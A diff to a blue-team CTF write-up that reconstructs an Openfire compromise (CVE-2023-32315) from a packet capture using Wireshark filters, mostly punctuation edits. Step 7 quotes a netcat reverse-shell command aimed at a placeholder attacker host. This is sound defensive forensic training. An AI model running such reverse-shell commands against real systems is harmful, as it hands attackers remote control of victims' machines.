@@ -1,6 +1,6 @@
 # OpenFire - Network Forensics (PCAP)
 
-**Environment:** CyberDefenders (Blue Team CTF)  ·  **Category:** Network Forensics  ·  **Difficulty:** Easy  ·  **Date completed:** [add your date, 2026-09-08]
+**Environment:** CyberDefenders (Blue Team CTF)  ·  **Category:** Network Forensics  ·  **Difficulty:** Easy  ·  **Date completed:** [2026-09-08]
 **Tags:** `network-forensics` `pcap` `wireshark` `cve-2023-32315` `openfire` `mitre-attack`
 
 > Educational lab exercise from CyberDefenders. Challenge-specific answer values (tokens, credentials, created usernames, host addresses) are redacted or masked in line with the platform's terms — the focus of this write-up is the PCAP analysis methodology.
@@ -9,7 +9,7 @@
 
 ## Scenario & objective
 
-A packet capture from a compromised **Openfire** messaging server. The objective was to reconstruct the intrusion end-to-end from network traffic alone — identifying the initial login, unauthorised account creation, a malicious plugin upload, remote command execution, and the reverse shell — and to determine the vulnerability the attacker exploited.
+A packet capture from a compromised **Openfire** messaging server. The objective was to reconstruct the intrusion end-to-end from network traffic alone - identifying the initial login, unauthorised account creation, a malicious plugin upload, remote command execution, and the reverse shell - and to determine the vulnerability the attacker exploited.
 
 This was a pure **network-forensics** exercise: no endpoint logs or memory image, just the wire. The whole investigation lived in the PCAP.
 
@@ -20,25 +20,25 @@ This was a pure **network-forensics** exercise: no endpoint logs or memory image
 
 ## Tools used
 
-- **Wireshark** — the entire investigation: display filters, chronological sorting, and HTTP/TCP stream following
+- **Wireshark** - the entire investigation: display filters, chronological sorting, and HTTP/TCP stream following
 
 ## Investigation & methodology
 
-**1. Order the timeline first.** Loaded the PCAP, applied an `http` filter, and sorted the time column ascending so events were strictly chronological — essential when the questions ask for the *first* login, the *first* account created, and so on. Getting the ordering right up front avoided misattributing later events to earlier ones.
+**1. Order the timeline first.** Loaded the PCAP, applied an `http` filter, and sorted the time column ascending so events were strictly chronological - essential when the questions ask for the *first* login, the *first* account created, and so on. Getting the ordering right up front avoided misattributing later events to earlier ones.
 
 **2. Isolate authentication.** Filtered to POST requests against the login endpoint (`http.request.method == "POST"`, `/login.jsp`) and inspected the earliest one. Because the traffic was cleartext, the request body exposed the submitted username, password, and the CSRF token directly — the first login's credentials and token came straight out of that single request.
 
 **3. Find attacker-created accounts.** Pivoted with a URI filter (`http.request.uri contains "user"`) and looked specifically for `user-create.jsp` requests. The parameters on those requests carried the new usernames, passwords, and an admin-privilege flag; taking the earliest `user-create.jsp` in the ordered list gave the first account the attacker created.
 
-**4. Identify the backdoor login.** Returning to the login POSTs, the *last* `login.jsp` request showed the attacker authenticating with one of the accounts created earlier — confirming they'd built a rogue admin account and then logged in with it to hold access.
+**4. Identify the backdoor login.** Returning to the login POSTs, the *last* `login.jsp` request showed the attacker authenticating with one of the accounts created earlier - confirming they'd built a rogue admin account and then logged in with it to hold access.
 
-**5. Spot the plugin upload by its shape, not its content.** Staying on the POST filter, a request to `plugin-admin.jsp` stood out purely by size — roughly **2.5 KB** against the few-hundred-byte login requests. That length anomaly was the tell. Following the HTTP stream confirmed a `multipart/form-data` body carrying a malicious **JAR plugin** — the persistence/RCE mechanism.
+**5. Spot the plugin upload by its shape, not its content.** Staying on the POST filter, a request to `plugin-admin.jsp` stood out purely by size - roughly **2.5 KB** against the few-hundred-byte login requests. That length anomaly was the tell. Following the HTTP stream confirmed a `multipart/form-data` body carrying a malicious **JAR plugin** — the persistence/RCE mechanism.
 
 **6. Trace command execution.** Filtered on `http.request.uri contains "cmd"` to surface requests to the plugin's `cmd.jsp` endpoint (the command interface the malicious plugin exposed). Inspecting the first request's payload showed the attacker's opening move — a `whoami` to check privilege.
 
 **7. Recover the reverse shell and follow it.** In the same command traffic, one `cmd.jsp` request carried a **Netcat reverse shell** back to the attacker's host (`nc <attacker-ip> <port> -e /bin/bash`). Switching from the HTTP view to the TCP stream for that session (`ip.src == <attacker-ip> && tcp.port == <port>`) exposed the interactive commands that followed — including network-interface recon (`ifconfig`).
 
-**8. Attribute the root cause.** The exploitation pattern — an unauthenticated path into the admin console followed by a plugin upload leading to RCE — matched **CVE-2023-32315**, the Openfire admin-console path-traversal / authentication-bypass vulnerability. The observed chain (unauthorised access → plugin upload → command execution) aligned with it exactly.
+**8. Attribute the root cause.** The exploitation pattern - an unauthenticated path into the admin console followed by a plugin upload leading to RCE - matched **CVE-2023-32315**, the Openfire admin-console path-traversal / authentication-bypass vulnerability. The observed chain (unauthorised access → plugin upload → command execution) aligned with it exactly.
 
 ## Key findings
 
